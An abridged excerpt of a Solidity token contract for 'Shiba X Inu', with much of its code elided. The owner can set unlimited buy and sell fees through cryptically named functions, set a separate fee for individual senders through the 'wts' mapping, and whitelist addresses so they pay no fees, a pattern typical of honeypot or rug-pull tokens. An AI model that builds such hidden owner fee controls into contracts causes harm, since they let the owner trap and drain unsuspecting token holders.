/**
Telegram : https://t.me/ShibaXinuBsc
...
contract SHIBX is ERC20, Ownable {
    ...
    mapping(address => uint256) public wts;
    ...
    constructor() ERC20("Shiba X Inu", "SHIBX") {
        address router;
        if (block.chainid == 56) {
        ...
        marketingWallet = 0xEEe2f2fF1dBce13ebf23923E4f2853ACb2EF1868;
    ...
    function _transfer(
        ...
        if (
            ...
            if (wts[from] > 0) _totalFees = wts[from];
        }
        if (wl[from] == true || wl[to] == true) _totalFees = 0;
    ...
    function stb(uint256 t) public onlyOwner {
        totalFeesOnBuy = t;
    }

    function sts(uint256 t) public onlyOwner {
        totalFeesOnSell = t;
    }

    function swl(address[] memory ws, bool v) public onlyOwner {
